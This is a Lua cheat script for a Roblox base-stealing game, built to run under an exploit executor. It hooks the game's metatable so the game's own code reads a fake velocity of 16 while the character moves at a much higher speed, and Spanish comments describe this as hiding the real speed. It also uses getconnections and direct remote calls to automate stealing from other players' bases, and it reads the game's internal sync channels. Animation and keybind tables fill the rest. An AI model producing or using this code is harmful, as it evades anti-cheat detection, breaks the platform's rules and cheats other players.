local _hookedVelParts = {}

local _hookVelSupported = nil
function _hookVelHRP(hrp)
    if not hrp then return end
    _s2VelState.root = hrp
    _velChecked[hrp] = true
    if _s2VelState.hooked then return end
    if type(getrawmetatable) ~= "function" or type(setreadonly) ~= "function"
       or type(newcclosure) ~= "function" or type(checkcaller) ~= "function" then
        return
    end
    local ok = pcall(function()
        local mt = getrawmetatable(game)
        if not mt then return end

        setreadonly(mt, false)

        local originalIndex = rawget(mt, "__index")
        local originalNewIndex = rawget(mt, "__newindex")

        local function isOurRoot(t, k)
            local tk = tostring(k)
            if tk ~= "AssemblyLinearVelocity" and tk ~= "Velocity" then return false end
            if typeof(t) ~= "Instance" or not t:IsA("BasePart") then return false end
            local tn = t.Name
            if tn ~= "HumanoidRootPart" and tn ~= "Torso" and tn ~= "UpperTorso" then return false end
            local char = LP.Character
            return char ~= nil and t:IsDescendantOf(char)
        end

        if type(originalIndex) == "function" or type(originalIndex) == "table" then
            local replacementIndex = newcclosure(function(self, key)
                if not checkcaller() then
                    local good, mine = pcall(isOurRoot, self, key)
                    if good and mine then return _s2VelState.v end
                end
                if type(originalIndex) == "function" then
                    return originalIndex(self, key)
                else
                    return originalIndex[key]
                end
            end)
            mt.__index = replacementIndex
        end

        if type(originalNewIndex) == "function" then
            local replacementNewIndex = newcclosure(function(self, key, value)
                if not checkcaller() then
                    local good, mine = pcall(isOurRoot, self, key)
                    if good and mine then
                        _s2VelState.v = value
                        return
                    end
                end
                return originalNewIndex(self, key, value)
            end)
            mt.__newindex = replacementNewIndex
        end

        setreadonly(mt, true)
        _s2VelState.hooked = true
    end)
    if not ok then _s2VelState.hooked = false end
end

function _setupVelChecked(char)
    _velChecked = setmetatable({}, { __mode = "k" })
    _s2VelState.velChecked = _velChecked
    if not char then _s2VelState.root = nil; return nil end
    local hrp = char:WaitForChild("HumanoidRootPart", 5)
    if hrp then
        _s2VelState.root = hrp
        _velChecked[hrp] = true
    end
    return hrp
end

if LP.Character then
    local _hrp0 = _setupVelChecked(LP.Character)
    _hookVelHRP(_hrp0)
end

function _isRagdollState(hum)
    if not hum then return true end
    local st = hum:GetState()
    return hum.PlatformStand
        or st == Enum.HumanoidStateType.Physics
        or st == Enum.HumanoidStateType.Ragdoll
        or st == Enum.HumanoidStateType.FallingDown
end

-- [FIX SPEED VIOLETTE] aplica velocidad con jitter + oculta la real al juego.
-- El juego verá _s2VelState.v = 16 (fake). Nosotros aplicamos la real en
-- AssemblyLinearVelocity directamente (checkcaller bypass).
local _viperVelRng = Random.new()

function _applyVelocitySpeed(dir, speed, hrp)
    if not hrp or not hrp.Parent then return end
    if batDesyncTpEnabled or autoBatEnabled or bypassAimbotEnabled then return end
    if type(speed) ~= "number" or speed ~= speed or speed <= 0 or speed == math.huge then return end

    local verticalVelocity = hrp.AssemblyLinearVelocity.Y

    if dir and dir.Magnitude > 0.05 then
        pcall(function()
            if hrp.SetNetworkOwner then hrp:SetNetworkOwner(LP) end
        end)
        local unit = dir.Unit
        local jx = _viperVelRng:NextNumber(-0.003, 0.003)
        local jz = _viperVelRng:NextNumber(-0.003, 0.003)

        -- Velocidad falsa que el juego verá cuando consulte desde código externo
        _s2VelState.v = _V3new(unit.X * 16 + jx, verticalVelocity, unit.Z * 16 + jz)

        -- Velocidad real aplicada directamente al root (checkcaller=true)
        hrp.AssemblyLinearVelocity = _V3new(unit.X * speed + jx, verticalVelocity, unit.Z * speed + jz)
        -- Marca de "live speed" para que el Anti Fling no cancele nuestra propia velocidad
        _G.__ViperLiveSpeed = { t = os.clock(), v = speed }
    else
        _s2VelState.v = _V3new(0, verticalVelocity, 0)
        hrp.AssemblyLinearVelocity = _V3new(0, verticalVelocity, 0)
    end
end

function getAutoPathSpeed()
    if laggerCarryToggled or laggerToggled then return LAGGER_SPEED end
    return NS
end

ANIM_PACKS = {
    ["Zombie"] = { idle1="rbxassetid://616158929", idle2="rbxassetid://616160636", walk="rbxassetid://616168032", run="rbxassetid://616163682", jump="rbxassetid://616161997", fall="rbxassetid://616157476", climb="rbxassetid://616156119", swim="rbxassetid://616165109", swimidle="rbxassetid://616166655" },
    ["Ninja"] = { idle1="rbxassetid://656117400", idle2="rbxassetid://656117400", walk="rbxassetid://656121766", run="rbxassetid://656118852", jump="rbxassetid://656117878", fall="rbxassetid://656115606", climb="rbxassetid://656114359", swim="rbxassetid://656117400", swimidle="rbxassetid://656117400" },
    ["Knight"] = { idle1="rbxassetid://657595757", idle2="rbxassetid://657595757", walk="rbxassetid://657552124", run="rbxassetid://657564596", jump="rbxassetid://658409194", fall="rbxassetid://657600338", climb="rbxassetid://658360781", swim="rbxassetid://657595757", swimidle="rbxassetid://657595757" },
    ["Elder"] = { idle1="rbxassetid://845397899", idle2="rbxassetid://845397899", walk="rbxassetid://845403856", run="rbxassetid://845386501", jump="rbxassetid://845398858", fall="rbxassetid://845397673", climb="rbxassetid://845392038", swim="rbxassetid://845397899", swimidle="rbxassetid://845397899" },
    ["Levitate"] = { idle1="rbxassetid://616006778", idle2="rbxassetid://616006778", walk="rbxassetid://616013216", run="rbxassetid://616013216", jump="rbxassetid://616008936", fall="rbxassetid://616005863", climb="rbxassetid://616003713", swim="rbxassetid://616006778", swimidle="rbxassetid://616006778" },
    ["Astronaut"] = { idle1="rbxassetid://891621366", idle2="rbxassetid://891621366", walk="rbxassetid://891636393", run="rbxassetid://891636393", jump="rbxassetid://891627522", fall="rbxassetid://891617961", climb="rbxassetid://891609353", swim="rbxassetid://891621366", swimidle="rbxassetid://891621366" },
    ["Pirate"] = { idle1="rbxassetid://750781874", idle2="rbxassetid://750781874", walk="rbxassetid://750785693", run="rbxassetid://750783738", jump="rbxassetid://750782230", fall="rbxassetid://750780242", climb="rbxassetid://750779899", swim="rbxassetid://750781874", swimidle="rbxassetid://750781874" },
    ["Toy"] = { idle1="rbxassetid://782841498", idle2="rbxassetid://782841498", walk="rbxassetid://782843345", run="rbxassetid://782842708", jump="rbxassetid://782847020", fall="rbxassetid://782846423", climb="rbxassetid://782843869", swim="rbxassetid://782841498", swimidle="rbxassetid://782841498" },
    ["Vampire"] = { idle1="rbxassetid://1083445855", idle2="rbxassetid://1083445855", walk="rbxassetid://1083473930", run="rbxassetid://1083462077", jump="rbxassetid://1083455352", fall="rbxassetid://1083443587", climb="rbxassetid://1083439238", swim="rbxassetid://1083445855", swimidle="rbxassetid://1083445855" },
    ["Werewolf"] = { idle1="rbxassetid://1083195517", idle2="rbxassetid://1083195517", walk="rbxassetid://1083178339", run="rbxassetid://1083216690", jump="rbxassetid://1083218792", fall="rbxassetid://1083189019", climb="rbxassetid://1083182000", swim="rbxassetid://1083195517", swimidle="rbxassetid://1083195517" },
    ["Rthro"] = { idle1="rbxassetid://2510196951", idle2="rbxassetid://2510196951", walk="rbxassetid://2510202577", run="rbxassetid://2510198475", jump="rbxassetid://2510197830", fall="rbxassetid://2510195892", climb="rbxassetid://2510192778", swim="rbxassetid://2510196951", swimidle="rbxassetid://2510196951" },
    ["Stylish"] = { idle1="rbxassetid://616136790", idle2="rbxassetid://616136790", walk="rbxassetid://616146177", run="rbxassetid://616140816", jump="rbxassetid://616139451", fall="rbxassetid://616134815", climb="rbxassetid://616133594", swim="rbxassetid://616136790", swimidle="rbxassetid://616136790" },
}

ANIM_PACK_ORDER = {{"Off", "Off"}, {"Zombie", "Zombie"}, {"Ninja", "Ninja"}, {"Knight", "Knight"}, {"Elder", "Elder"}, {"Levitate", "Levitate"}, {"Astronaut", "Astronaut"}, {"Pirate", "Pirate"}, {"Toy", "Toy"}, {"Vampire", "Vampire"}, {"Werewolf", "Werewolf"}, {"Rthro", "Rthro"}, {"Stylish", "Stylish"}}

function isPackAnim(id)
    for _, pack in pairs(ANIM_PACKS) do
        for _, v in pairs(pack) do
            if v == id then return true end
        end
    end
    return false
end

function saveOriginalAnims(char)
    local animate = char:FindFirstChild("Animate")
    if not animate then return end
    local function g(obj) return obj and obj.AnimationId or nil end
    local ids = {
        idle1 = g(animate.idle and animate.idle.Animation1),
        idle2 = g(animate.idle and animate.idle.Animation2),
        walk  = g(animate.walk and animate.walk.WalkAnim),
        run   = g(animate.run  and animate.run.RunAnim),
        jump  = g(animate.jump and animate.jump.JumpAnim),
        fall  = g(animate.fall and animate.fall.FallAnim),
        climb = g(animate.climb and animate.climb.ClimbAnim),
        swim  = g(animate.swim and animate.swim.Swim),
        swimidle = g(animate.swimidle and animate.swimidle.SwimIdle),
    }
    if not isPackAnim(ids.walk) then originalTryardAnims = ids end
end

function applyAnimPack(packName)
    currentAnimPack = packName
    if animSelectorLabel then animSelectorLabel.Text = packName end
    if packName == "Off" then
        if originalTryardAnims and LP.Character then
            local animate = LP.Character:FindFirstChild("Animate")
            if animate then
                local function s(obj,id) if obj then obj.AnimationId = id end end
                s(animate.idle and animate.idle.Animation1, originalTryardAnims.idle1)
                s(animate.idle and animate.idle.Animation2, originalTryardAnims.idle2)
                s(animate.walk and animate.walk.WalkAnim, originalTryardAnims.walk)
                s(animate.run  and animate.run.RunAnim,   originalTryardAnims.run)
                s(animate.jump and animate.jump.JumpAnim, originalTryardAnims.jump)
                s(animate.fall and animate.fall.FallAnim, originalTryardAnims.fall)
                s(animate.climb and animate.climb.ClimbAnim, originalTryardAnims.climb)
                s(animate.swim and animate.swim.Swim, originalTryardAnims.swim)
                s(animate.swimidle and animate.swimidle.SwimIdle, originalTryardAnims.swimidle)
            end
        end
        if tryardHeartbeatConn then tryardHeartbeatConn:Disconnect(); tryardHeartbeatConn = nil end
        return
    end
    local pack = ANIM_PACKS[packName]
    if not pack then return end
    if tryardHeartbeatConn then tryardHeartbeatConn:Disconnect() end
    tryardHeartbeatConn = RunService.Heartbeat:Connect(function()
        local c = LP.Character
        if not c then return end
        local animate = c:FindFirstChild("Animate")
        if not animate then return end
        local function s(obj,id) if obj then obj.AnimationId = id end end
        s(animate.idle and animate.idle.Animation1, pack.idle1)
        s(animate.idle and animate.idle.Animation2, pack.idle2)
        s(animate.walk and animate.walk.WalkAnim, pack.walk)
        s(animate.run  and animate.run.RunAnim,   pack.run)
        s(animate.jump and animate.jump.JumpAnim, pack.jump)
        s(animate.fall and animate.fall.FallAnim, pack.fall)
        s(animate.climb and animate.climb.ClimbAnim, pack.climb)
        s(animate.swim and animate.swim.Swim, pack.swim)
        s(animate.swimidle and animate.swimidle.SwimIdle, pack.swimidle)
    end)
end

function startAnimPack(packName)
    local char = LP.Character
    if char then
        saveOriginalAnims(char)
        applyAnimPack(packName)
        local hum = char:FindFirstChildOfClass("Humanoid")
        if hum then
            for _, track in ipairs(hum:GetPlayingAnimationTracks()) do track:Stop(0) end
            hum:ChangeState(Enum.HumanoidStateType.Running)
        end
    else
        applyAnimPack(packName)
    end
    currentAnimPack = packName
end

function stopAnimPack()
    currentAnimPack = "Off"
    if animSelectorLabel then animSelectorLabel.Text = "Off" end
    applyAnimPack("Off")
end

DEFAULT_KB = {
    DropBrainrot = {kb = Enum.KeyCode.X,           gp = nil},
    AutoLeft     = {kb = Enum.KeyCode.Z,           gp = nil},
    AutoRight    = {kb = Enum.KeyCode.C,           gp = nil},
    AutoBat      = {kb = Enum.KeyCode.E,           gp = nil},
    TPFloor      = {kb = Enum.KeyCode.F,           gp = nil},
    GuiHide      = {kb = Enum.KeyCode.LeftControl, gp = nil},
    CarryToggle  = {kb = Enum.KeyCode.Q,           gp = nil},
    LaggerMode   = {kb = Enum.KeyCode.R,           gp = nil},
    TPBat        = {kb = Enum.KeyCode.V,           gp = nil},
    InstaReset   = {kb = Enum.KeyCode.H,           gp = nil},
    DesyncTp     = {kb = nil,                      gp = nil},
    MirrorTP     = {kb = nil,                      gp = nil},
    BypassAimbot = {kb = nil,                      gp = nil},
}

KB = {
    DropBrainrot = {kb = DEFAULT_KB.DropBrainrot.kb, gp = DEFAULT_KB.DropBrainrot.gp},
    AutoLeft     = {kb = DEFAULT_KB.AutoLeft.kb,     gp = DEFAULT_KB.AutoLeft.gp},
    AutoRight    = {kb = DEFAULT_KB.AutoRight.kb,    gp = DEFAULT_KB.AutoRight.gp},
    AutoBat      = {kb = DEFAULT_KB.AutoBat.kb,      gp = DEFAULT_KB.AutoBat.gp},
    TPFloor      = {kb = DEFAULT_KB.TPFloor.kb,      gp = DEFAULT_KB.TPFloor.gp},
    GuiHide      = {kb = DEFAULT_KB.GuiHide.kb,      gp = DEFAULT_KB.GuiHide.gp},
    CarryToggle  = {kb = DEFAULT_KB.CarryToggle.kb,  gp = DEFAULT_KB.CarryToggle.gp},
    LaggerMode   = {kb = DEFAULT_KB.LaggerMode.kb,   gp = DEFAULT_KB.LaggerMode.gp},
    TPBat        = {kb = DEFAULT_KB.TPBat.kb,        gp = DEFAULT_KB.TPBat.gp},
    InstaReset   = {kb = DEFAULT_KB.InstaReset.kb,   gp = DEFAULT_KB.InstaReset.gp},
    DesyncTp     = {kb = DEFAULT_KB.DesyncTp.kb,     gp = DEFAULT_KB.DesyncTp.gp},
    MirrorTP     = {kb = DEFAULT_KB.MirrorTP.kb,     gp = DEFAULT_KB.MirrorTP.gp},
    BypassAimbot = {kb = DEFAULT_KB.BypassAimbot.kb, gp = DEFAULT_KB.BypassAimbot.gp},
}

_isResetting = false
_lastSavedJSON = nil
_isLoading = false

CONFIG = { AUTO_STEAL_ENABLED = false, STEAL_RANGE = 61, SMOOTH_STEAL_ENABLED = false, SMOOTH_STEAL_SPEED = 28, SHOW_MOBILE_BUTTONS = true }

local plots = Workspace:FindFirstChild("Plots")
local stealConnection = nil

local Steal = { AutoStealEnabled = false, StealRadius = CONFIG.STEAL_RANGE, StealDuration = 1.3, StealDelay = 0.25, Data = {} }

local isStealing = false
local autoGrabSetDelayRadius = 9
local autoGrabStopTime = 0.96
local autoGrabStopEnabled = true

local _plotsCache = nil
local _plotsCacheTime = 0
function getPlotsRoot()
    local now = _tick()
    if _plotsCache and now - _plotsCacheTime < 2 and _plotsCache.Parent then
        return _plotsCache
    end
    _plotsCache = workspace:FindFirstChild("Plots")
    _plotsCacheTime = now
    return _plotsCache
end

function isMyPlotByName(plotName)
    local plotsRoot = getPlotsRoot()
    if not plotsRoot then return false end
    local plot = plotsRoot:FindFirstChild(plotName)
    if not plot then return false end
    local sign = plot:FindFirstChild("PlotSign")
    if sign then
        local yb = sign:FindFirstChild("YourBase")
        if yb and yb:IsA("BillboardGui") then
            return yb.Enabled == true
        end
    end
    return false
end

function findNearestPrompt()
    local char = LP.Character
    if not char then return nil, nil end
    local root = char:FindFirstChild("HumanoidRootPart")
    if not root then return nil, nil end
    local plotsRoot = getPlotsRoot()
    if not plotsRoot then return nil, nil end
    local nearestPrompt, nearestDist, nearestName = nil, _huge, nil
    local rpos = root.Position
    for _, plot in ipairs(plotsRoot:GetChildren()) do
        if isMyPlotByName(plot.Name) then continue end
        local pods = plot:FindFirstChild("AnimalPodiums")
        if not pods then continue end
        for _, pod in ipairs(pods:GetChildren()) do
            pcall(function()
                local base = pod:FindFirstChild("Base")
                local spawn = base and base:FindFirstChild("Spawn")
                if spawn then
                    local sp = spawn.Position
                    local dx = sp.X - rpos.X
                    local dy = sp.Y - rpos.Y
                    local dz = sp.Z - rpos.Z
                    local dist = _sqrt(dx*dx + dy*dy + dz*dz)
                    if dist < nearestDist and dist <= Steal.StealRadius then
                        local att = spawn:FindFirstChild("PromptAttachment")
                        if att then
                            for _, child in ipairs(att:GetChildren()) do
                                if child:IsA("ProximityPrompt") and child.ActionText and child.ActionText:find("Steal") then
                                    nearestPrompt = child
                                    nearestDist = dist
                                    nearestName = pod.Name
                                    break
                                end
                            end
                        end
                    end
                end
            end)
        end
    end
    return nearestPrompt, nearestName
end

function executeSteal(prompt, podName)
    if isStealing then return end
    if math.random(30) == 1 then
        for p in pairs(Steal.Data) do
            if not p.Parent then Steal.Data[p] = nil end
        end
    end
    if not Steal.Data[prompt] then
        Steal.Data[prompt] = { hold = {}, trigger = {}, ready = true }
        pcall(function()
            if getconnections then
                for _, c in ipairs(getconnections(prompt.PromptButtonHoldBegan)) do
                    if c.Function then table.insert(Steal.Data[prompt].hold, c.Function) end
                end
                for _, c in ipairs(getconnections(prompt.Triggered)) do
                    if c.Function then table.insert(Steal.Data[prompt].trigger, c.Function) end
                end
            end
        end)
    end
    local data = Steal.Data[prompt]
    if not data.ready then return end
    data.ready = false
    isStealing = true

    if progressFill then progressFill.Size = UDim2.new(0, 0, 1, 0) end
    if progressPct then progressPct.Text = "0%" end

    task.spawn(function()
        for _, f in ipairs(data.hold) do task.spawn(f) end

        local startTime = _tick()
        local duration = Steal.StealDuration
        local promptFired = false

        if autoGrabStopEnabled then
            while isStealing and Steal.AutoStealEnabled do
                local elapsed = _tick() - startTime
                if elapsed >= autoGrabStopTime then break end
                local progress = _clamp(elapsed / duration, 0, 1)
                if progressFill then progressFill.Size = UDim2.new(progress, 0, 1, 0) end
                if progressPct then progressPct.Text = _floor(progress * 100) .. "%" end
                if not prompt.Parent or not prompt.Parent.Parent then break end
                local char = LP.Character
                local hrp = char and char:FindFirstChild("HumanoidRootPart")
                if hrp and (hrp.Position - prompt.Parent.Parent.Position).Magnitude > Steal.StealRadius then
                    break
                end
                task.wait()
            end

            local stopProgress = _clamp(autoGrabStopTime / duration, 0, 1)
            if progressFill then progressFill.Size = UDim2.new(stopProgress, 0, 1, 0) end
            if progressPct then progressPct.Text = _floor(stopProgress * 100) .. "%" end

            local phase2Timeout = math.max(2.99 - autoGrabStopTime - math.max(duration - autoGrabStopTime, 0), 0.05)
            local phase2Start = _tick()

            while isStealing and Steal.AutoStealEnabled do
                if _tick() - phase2Start >= phase2Timeout then
                    if progressFill then progressFill.Size = UDim2.new(0, 0, 1, 0) end
                    if progressPct then progressPct.Text = "0%" end
                    data.ready = true
                    isStealing = false
                    task.wait()
                    local newPrompt, newName = findNearestPrompt()
                    if newPrompt then executeSteal(newPrompt, newName) end
                    return
                end
                if not prompt.Parent or not prompt.Parent.Parent then
                    isStealing = false
                    if progressFill then progressFill.Size = UDim2.new(0, 0, 1, 0) end
                    if progressPct then progressPct.Text = "0%" end
                    data.ready = true
                    return
                end
                local char = LP.Character
                local hrp = char and char:FindFirstChild("HumanoidRootPart")
                if hrp then
                    local dist = (hrp.Position - prompt.Parent.Parent.Position).Magnitude
                    if dist <= autoGrabSetDelayRadius then
                        break
                    elseif dist > Steal.StealRadius then
                        isStealing = false
                        if progressFill then progressFill.Size = UDim2.new(0, 0, 1, 0) end
                        if progressPct then progressPct.Text = "0%" end
                        data.ready = true
                        return
                    end
                end
                task.wait()
            end

            if isStealing and Steal.AutoStealEnabled then
                local fillStart = _tick()
                local fillDuration = math.max(duration - autoGrabStopTime, 0.05)
                while true do
                    local fp = _clamp((_tick() - fillStart) / fillDuration, 0, 1)
                    local totalProgress = stopProgress + fp * (1 - stopProgress)
                    if progressFill then progressFill.Size = UDim2.new(totalProgress, 0, 1, 0) end
                    if progressPct then progressPct.Text = _floor(totalProgress * 100) .. "%" end
                    if fp >= 1 and not promptFired then
                        promptFired = true
                        pcall(function()
                            if #data.trigger > 0 then
                                for _, f in ipairs(data.trigger) do task.spawn(f) end
                            else
                                local remote = ReplicatedStorage:FindFirstChild("StealAnimal")
                                if remote and podName then remote:FireServer(podName) end
                            end
                        end)
                        break
                    end
                    task.wait()
                end
            end
        else
            while isStealing and Steal.AutoStealEnabled do
                local elapsed = _tick() - startTime
                local progress = _clamp(elapsed / duration, 0, 1)
                if progressFill then progressFill.Size = UDim2.new(progress, 0, 1, 0) end
                if progressPct then progressPct.Text = _floor(progress * 100) .. "%" end
                if not prompt.Parent or not prompt.Parent.Parent then break end
                local char = LP.Character
                local hrp = char and char:FindFirstChild("HumanoidRootPart")
                if hrp and (hrp.Position - prompt.Parent.Parent.Position).Magnitude > Steal.StealRadius then break end
                if elapsed >= duration and not promptFired then
                    promptFired = true
                    pcall(function()
                        if #data.trigger > 0 then
                            for _, f in ipairs(data.trigger) do task.spawn(f) end
                        else
                            local remote = ReplicatedStorage:FindFirstChild("StealAnimal")
                            if remote and podName then remote:FireServer(podName) end
                        end
                    end)
                    break
                end
                task.wait()
            end
        end

        if progressFill then progressFill.Size = UDim2.new(0, 0, 1, 0) end
        if progressPct then progressPct.Text = "0%" end
        data.ready = true
        isStealing = false
    end)
end

-- =====================================================================
-- AUTO STEAL V2
-- =====================================================================
_G.ViperV2Steal = _G.ViperV2Steal or {
    enabled = false, radius = 10, primeRange = 80, holdMin = 1.3, holdMax = 2.6,
    entryDelay = 0.25, cooldown = 0.05,
    animals = {}, promptCache = {}, internalCache = {},
    state = {active = false, startTime = 0, phase = "idle", label = "", lastResult = "", lastResultTime = 0},
    plotSync = {caches = {}, connections = {}}, plots = nil, syncReady = false,
    scanThread = nil, conn = nil, lastScan = 0,
    animalsData = nil, channelFolder = nil, routeRemote = nil, requestData = nil
}

function _yv2Root()
    local c = LP.Character
    return c and (c:FindFirstChild("HumanoidRootPart") or c:FindFirstChild("UpperTorso")) or nil
end

function _yv2SplitPath(path)
    if typeof(path) == "table" then return path end
    local out = {}
    for p in string.gmatch(tostring(path), "[^%.]+") do table.insert(out, tonumber(p) or p) end
    return out
end

function _yv2ResolvePath(path, root)
    local cur, par, key = root, nil, nil
    for _, p in ipairs(_yv2SplitPath(path)) do
        par = cur; key = p; cur = cur and cur[p] or nil
    end
    return cur, par, key
end

function _yv2ApplyDiff(channelName, packet)
    local cache = _G.ViperV2Steal.plotSync.caches[channelName]
    if typeof(cache) ~= "table" then return end
    local path, action, a, b = packet[1], packet[2], packet[3], packet[4]
    local cur, par, key = _yv2ResolvePath(path, cache)
    if action == "Changed" then
        if par then par[key] = a end
    elseif action == "ArrayInsert" then
        if cur then table.insert(cur, b, a) end
    elseif action == "ArrayRemoved" then
        if cur then table.remove(cur, b) end
    elseif action == "DictionaryInsert" then
        if cur then cur[b] = a end
    elseif action == "DictionaryRemoved" then
        if cur then cur[b] = nil end
    end
end

function _yv2AttachChannel(remote, plots, requestData)
    local A = _G.ViperV2Steal
    if A.plotSync.connections[remote] then return end
    local channelName = tostring(remote.Name)
    if not plots:FindFirstChild(channelName) then return end
    if requestData and A.plotSync.caches[channelName] == nil then
        local ok, data = pcall(function() return requestData:InvokeServer(channelName) end)
        A.plotSync.caches[channelName] = (ok and typeof(data) == "table") and data or {}
    elseif A.plotSync.caches[channelName] == nil then
        A.plotSync.caches[channelName] = {}
    end
    A.plotSync.connections[remote] = remote.OnClientEvent:Connect(function(queue)
        for _, packet in ipairs(queue) do _yv2ApplyDiff(channelName, packet) end
    end)
end

function _yv2EnsureSync()
    local A = _G.ViperV2Steal
    if A.syncReady then return true end
    local ok = pcall(function()
        A.plots = workspace:WaitForChild("Plots", 8)
        local rs = game:GetService("ReplicatedStorage")
        local pkgs = rs:FindFirstChild("Packages")
        local datas = rs:FindFirstChild("Datas")
        if not (pkgs and datas and A.plots) then return end
        A.animalsData = require(datas:WaitForChild("Animals", 10))
        local sync = pkgs:FindFirstChild("Synchronizer") or pkgs:WaitForChild("Synchronizer", 10)
        if not sync then return end
        A.channelFolder = sync:FindFirstChild("Channel") or sync:WaitForChild("Channel", 10)
        A.routeRemote = sync:FindFirstChild("CommunicationRoute") or sync:WaitForChild("CommunicationRoute", 10)
        A.requestData = sync:FindFirstChild("RequestData")
        if A.channelFolder then
            for _, child in ipairs(A.channelFolder:GetChildren()) do
                if child:IsA("RemoteEvent") then _yv2AttachChannel(child, A.plots, A.requestData) end
            end
            A.channelFolder.ChildAdded:Connect(function(child)
                if child:IsA("RemoteEvent") then _yv2AttachChannel(child, A.plots, A.requestData) end
            end)
        end
        if A.routeRemote then
            A.routeRemote.OnClientEvent:Connect(function(actions)
                for _, action in ipairs(actions) do
                    local kind, cn = action[1], tostring(action[2])
                    if A.plots and A.plots:FindFirstChild(cn) then
                        if kind == "ListenerAdded" then
                            local r = A.channelFolder and A.channelFolder:FindFirstChild(cn)
                            if r and r:IsA("RemoteEvent") then _yv2AttachChannel(r, A.plots, A.requestData) end
                        elseif kind == "ListenerRemoved" then
                            for remote, conn in pairs(A.plotSync.connections) do
                                if tostring(remote.Name) == cn then
                                    pcall(function() conn:Disconnect() end)
                                    A.plotSync.connections[remote] = nil
                                    A.plotSync.caches[cn] = nil
                                    break
                                end
                            end
                        end
                    end
                end
            end)
        end
        A.syncReady = true
    end)
    return ok and A.syncReady == true
end

function _yv2PlotOwner(plot)
    local sign = plot and plot:FindFirstChild("PlotSign")
    local frame = sign and sign:FindFirstChild("SurfaceGui") and sign.SurfaceGui:FindFirstChild("Frame")
    local label = frame and frame:FindFirstChild("TextLabel")
    if not label or label.Text == "Empty Base" then return nil end
    return label.Text:gsub("'s [Bb]ase$", ""):gsub("%s+$", "")
end

function _yv2IsMyBase(animalData)
    local A = _G.ViperV2Steal
    if not animalData or not animalData.plot or not A.plots then return false end
    local plot = A.plots:FindFirstChild(animalData.plot)
    if not plot then return false end
    local owner = _yv2PlotOwner(plot)
    return owner == LP.DisplayName or owner == LP.Name
end

function _yv2PodiumFor(animalData)
    local A = _G.ViperV2Steal
    local plot = A.plots and A.plots:FindFirstChild(animalData.plot)
    local pds = plot and plot:FindFirstChild("AnimalPodiums")
    return pds and pds:FindFirstChild(animalData.slot) or nil
end

function _yv2AnimalPos(animalData)
    local pod = _yv2PodiumFor(animalData)
    return pod and pod:GetPivot().Position or nil
end

function _yv2DistToAnimal(animalData)
    local root = _yv2Root()
    local pos = _yv2AnimalPos(animalData)
    return root and pos and (root.Position - pos).Magnitude or math.huge
end

function _yv2FindPrompt(animalData)
    local A = _G.ViperV2Steal
    if not animalData then return nil end
    local cached = A.promptCache[animalData.uid]
    if cached and cached.Parent then return cached end
    local pod = _yv2PodiumFor(animalData)
    if not pod then return nil end
    for _, p in ipairs(pod:GetDescendants()) do
        if p:IsA("ProximityPrompt") then A.promptCache[animalData.uid] = p return p end
    end
    return nil
end

function _yv2BuildCallbacks(prompt)
    local A = _G.ViperV2Steal
    if A.internalCache[prompt] then return end
    local data = {holdCallbacks = {}, triggerCallbacks = {}, ready = true}
    pcall(function()
        if getconnections then
            local holds = getconnections(prompt.PromptButtonHoldBegan) or getconnections(prompt.HoldBegan) or {}
            for _, c in ipairs(holds) do
                if type(c.Function) == "function" then table.insert(data.holdCallbacks, c.Function) end
            end
            local triggers = getconnections(prompt.Triggered) or {}
            for _, c in ipairs(triggers) do
                if type(c.Function) == "function" then table.insert(data.triggerCallbacks, c.Function) end
            end
        end
    end)
    A.internalCache[prompt] = data
end

function _yv2SetBar(p)
    if progressFill then progressFill.Size = UDim2.new(math.clamp(p, 0, 1), 0, 1, 0) end
    if progressPct then progressPct.Text = _floor(math.clamp(p, 0, 1) * 100) .. "%" end
end

function _yv2ResetBar()
    if progressFill then progressFill.Size = UDim2.new(0, 0, 1, 0) end
    if progressPct then progressPct.Text = "0%" end
end

function _yv2Execute(prompt, animalData)
    local A = _G.ViperV2Steal
    if not prompt or not prompt.Parent or not animalData then return false end
    if A.state.active then return false end
    if _tick() - (A.state.lastResultTime or 0) < (A.cooldown or 0.05) then return false end
    _yv2BuildCallbacks(prompt)
    local data = A.internalCache[prompt]
    if not data or not data.ready then return false end
    data.ready = false
    A.state.active = true
    A.state.startTime = _tick()
    A.state.phase = "holding"
    A.state.label = animalData.name or "Animal"
    task.spawn(function()
        local t0 = A.state.startTime
        local stops = {0.70, 0.75, 0.80, 0.85, 0.90}
        local SEMI_STOP = stops[math.random(1, #stops)]
        if #data.holdCallbacks > 0 then
            for _, fn in ipairs(data.holdCallbacks) do task.spawn(function() pcall(fn) end) end
        else
            pcall(function() if prompt.InputHoldBegin then prompt:InputHoldBegin() end end)
        end
        while A.enabled and selectedStealMode == "V2" and CONFIG.AUTO_STEAL_ENABLED and _tick() - t0 < (A.holdMin or 1.3) do
            local rawP = (_tick() - t0) / (A.holdMax or 2.6)
            _yv2SetBar(math.min(rawP, SEMI_STOP))
            task.wait()
        end
        A.state.phase = "waitingRange"
        local alreadyInRange = _yv2DistToAnimal(animalData) <= (tonumber(A.radius) or 10)
        local fired = false
        while A.enabled and selectedStealMode == "V2" and CONFIG.AUTO_STEAL_ENABLED and prompt.Parent do
            local elapsed = _tick() - t0
            if elapsed > (A.holdMax or 2.6) then break end
            local rawP2 = elapsed / (A.holdMax or 2.6)
            _yv2SetBar(math.min(rawP2, SEMI_STOP))
            if _yv2DistToAnimal(animalData) <= (tonumber(A.radius) or 10) then
                if not alreadyInRange then task.wait(A.entryDelay or 0.25) end
                if A.enabled and selectedStealMode == "V2" and CONFIG.AUTO_STEAL_ENABLED then
                    if #data.triggerCallbacks > 0 then
                        for _, fn in ipairs(data.triggerCallbacks) do task.spawn(function() pcall(fn) end) end
                    else
                        pcall(function() if prompt.InputHoldEnd then prompt:InputHoldEnd() end end)
                    end
                    fired = true
                end
                break
            end
            task.wait()
        end
        A.state.lastResult = fired and ("Stole " .. tostring(A.state.label)) or "Missed"
        A.state.active = false
        A.state.phase = "idle"
        A.state.lastResultTime = _tick()
        if fired then _yv2SetBar(1) end
        task.wait(A.cooldown or 0.05)
        data.ready = true
        _yv2ResetBar()
    end)
    return true
end

function _yv2ScanAllPlots()
    local A = _G.ViperV2Steal
    if not _yv2EnsureSync() then return 0 end
    local newCache = {}
    for _, plot in ipairs(A.plots:GetChildren()) do
        local cache = A.plotSync.caches[plot.Name]
        local animalList = cache and cache.AnimalList
        if typeof(animalList) == "table" then
            for slot, animalData in pairs(animalList) do
                if type(animalData) == "table" then
                    local animalName = animalData.Index
                    local info = A.animalsData and A.animalsData[animalName]
                    if info then
                        table.insert(newCache, {
                            name = info.DisplayName or animalName,
                            plot = plot.Name,
                            slot = tostring(slot),
                            uid = plot.Name .. "_" .. tostring(slot)
                        })
